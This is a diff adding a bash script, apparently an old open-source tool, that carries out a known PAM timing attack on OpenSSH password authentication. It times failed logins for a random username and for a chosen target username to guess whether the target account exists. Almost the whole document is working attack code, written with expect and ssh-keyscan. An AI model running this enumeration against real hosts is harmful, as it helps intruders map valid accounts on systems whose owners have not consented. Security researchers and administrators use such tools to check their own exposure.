@@ -1,0 +1,213 @@
+#!/bin/bash
+#
+# pam_timing by Jacob Appelbaum <jacob@appelbaum.net>
+# (C) Jan 23, 2010 - Reykjavik, Iceland
+#
+# This implements an old but well known PAM timing attack against OpenSSH.
+#
+# This was implemented in bash because I lost a bet. Don't ask.
+#
+# If you're not using public keys for authorization, OpenSSH may leak
+# information about valid users of your system through the PAM subsystem.
+# Not all systems are vulnerable and this timing issue dates to 2003.
+# It is rare to find vulnerable systems in the wild.
+#
+# XXX TODO: Hang head in shame for implementing psuedo fixed-point numbers
+#
+# This is Free Software released under the BSD license.
+#
+# Thanks to Christian Fromme <kaner@strace.org> and Niki Yoshiuchi
+#
+
+VERSION=3.1;
+CLEANUP="";
+
+help() {
+    echo "pam_timing version $VERSION";
+    echo "Measure failed login timing information about remote OpenSSH users.";
+    echo "$0 user host";
+    exit 1;
+}
+
+if [ "$#" != "2" ];
+then
+    help;
+else
+    export TESTUSER="$1";
+    export TESTHOST="$2";
+fi
+
+SSHOPTS="-oUserKnownHostsFile=";
+EXPECT=`which expect`;
+PURESSH=`which ssh`;
+CLEARENV="env -i ";
+SSH=$CLEARENV$PURESSH;
+SSHKEYSCAN=`which ssh-keyscan`;
+if [ ! -x $EXPECT ] && [ ! -x $SSH ] && [ ! -x $SSHKEYSCAN ];
+then
+    echo "Required software is missing. Please install it.";
+    exit 1;
+fi
+
+gen_temp() {
+    export HOSTKEYFILE=`mktemp`;
+    export CLEANUP=$HOSTKEYFILE;
+}
+
+fetch_host_key() {
+    $SSHKEYSCAN $TESTHOST 1> /dev/null 2>&1 > $HOSTKEYFILE;
+    if [ ! -s $HOSTKEYFILE ];
+    then
+        echo "We were unable to fetch the hostkey for $TESTHOST";
+        exit -1;
+    fi
+}
+
+gen_rand_username() {
+    export BADUSER="`head -c42 < /dev/urandom |tr -dc A-Za-z0-9`";
+}
+
+prep_for_probe() {
+    gen_temp;
+    fetch_host_key;
+    gen_rand_username;
+}
+
+# If this returns 23; we've found a host that only allows publickey login
+expect_pubkey_probe() {
+    export EXPECT_PUBKEY_PROBE=`mktemp`;
+    export CLEANUP=$CLEANUP" "$EXPECT_PUBKEY_PROBE;
+cat << EOF > $EXPECT_PUBKEY_PROBE
+    spawn $SSH $SSHOPTS$HOSTKEYFILE -l $EXPECTUSER $TESTHOST
+    expect {
+        "Permission denied (publickey)." { exit 23 }
+        password: { exit 13 }
+    }
+EOF
+}
+
+pubkey_probe() {
+    export EXPECTUSER=${BADUSER};
+    expect_pubkey_probe;
+    $EXPECT -f $EXPECT_PUBKEY_PROBE 1> /dev/null 2> /dev/null;
+    PUBKEYTEST="$?";
+    if [ "$PUBKEYTEST" == "23" ];
+    then
+        echo "It appears that the remote host only supports public key auth.";
+        clean_up;
+        exit -1;
+    elif [ "$PUBKEYTEST" == "13" ];
+    then
+        echo "It appears that the remote host supports password auth.";
+    fi
+}
+
+update_expect_password_probe() {
+    export EXPECT_PASSWD_PROBE=`mktemp`;
+    export CLEANUP=$CLEANUP" "$EXPECT_PASSWD_PROBE;
+cat << EOF > $EXPECT_PASSWD_PROBE
+    spawn $SSH $SSHOPTS$HOSTKEYFILE -l $EXPECTUSER $TESTHOST
+    expect {
+        password: { send '\r' }
+    }
+    interact
+EOF
+}
+
+update_expect_probe_handler() {
+    export EXPECT_ERROR_PROBE=`mktemp`;
+    export CLEANUP=$CLEANUP" "$EXPECT_ERROR_PROBE;
+cat << EOF > $EXPECT_ERROR_PROBE
+        spawn $EXPECT -f $EXPECT_PASSWD_PROBE
+        expect {
+            "Permission denied, please try again." { exit 42 }
+        }
+        interact
+EOF
+}
+
+prep_expect() {
+    update_expect_password_probe;
+    update_expect_probe_handler;
+}
+
+probe_user_jitter() {
+    # We actually make $RUNS number of probes per probe and return the average
+    # We pack a float into an int and then we pass the "float" to a global to
+    # bypass the insanity that is bash return value limitations!
+    export EXPECTUSER="$1";
+    TD=0;
+    RUNS=3;
+    echo "Attempting to probe for $EXPECTUSER";
+    prep_expect;
+    echo "Sending probes...";
+    for ((i=1; i <= $RUNS; i++))
+    do
+        echo -n "[ probe $i : ";
+        #T0=`date '+%N'`; If you want better precision; good luck with bash!
+        T0=`date '+%s'`;
+        $EXPECT -f $EXPECT_ERROR_PROBE 1> /dev/null 2> /dev/null;
+        T1=`date '+%s'`;
+        TR=$(($T1 - $T0));
+        TD="$(($(($T1 - $T0)) + $TD))";
+        echo "$TR seconds ]"
+    done
+    AVG=$(echo "$TD * 100 / $RUNS" | bc); # Floats, sorta (why bash? why?)
+    export ONEBYTERETURNVALUESARENTENOUGH="$AVG";
+}
+
+probe_away() {
+    probe_user_jitter "${BADUSER}";
+    # You can't just use $? here;
+    # This won't work because bash uses 1 byte ints; no values above 257!
+    # Thus this will fail for values above 256: export BADUSERJITTER=$?;
+    # But this next line (OMFG) won't:
+    export BADUSERJITTER="$ONEBYTERETURNVALUESARENTENOUGH";
+    probe_user_jitter "${TESTUSER}";
+    export TESTUSERJITTER="$ONEBYTERETURNVALUESARENTENOUGH";
+}
+
+timing_compare() {
+    # Some notes on timing:
+    # Timing in bash as we've implemented it is obviously imprecise!
+    # Some systems have a fixed high return time for known bad users
+    # Some systems have a fixed high return time for known *good* users
+    # Load on the target system will likely result in even worse results.
+    echo "We've found that likely bad users have an average jitter of:" \
+         "$(echo "scale=2; $BADUSERJITTER / 100.0" | bc ) seconds.";
+    echo "We've found that $TESTUSER has an average jitter of:" \
+         "$(echo "scale=2; $TESTUSERJITTER / 100.0" | bc ) seconds.";
+    if [ "$BADUSERJITTER" -eq "$TESTUSERJITTER" ] && \
+       [ "$TESTUSERJITTER" -eq 1000 ]; # Actually ten seconds...
+    then
+        echo "It appears that $TESTHOST has an average run time of ten seconds.";
+        echo "It is likely that this machine isn't vulnerable."
+        return 1;
+    fi
+    if [ "$TESTUSERJITTER" -gt "$BADUSERJITTER" ];
+    then
+        echo "It's possible that $TESTUSER is a valid account on $TESTHOST";
+        return 1;
+    fi
+    if [ "$TESTUSERJITTER" -le "$BADUSERJITTER" ];
+    then
+        echo "It appears that valid and invalid users have a close jitter."
+        echo "It is possible that this machine isn't vulnerable."
+        return 1;
+    fi
+}
+
+clean_up() {
+    rm $CLEANUP;
+}
+
+main () {
+    prep_for_probe;
+    pubkey_probe;
+    probe_away;
+    timing_compare;
+    clean_up;
+}
+
+# Hit the town and paint it red
+main
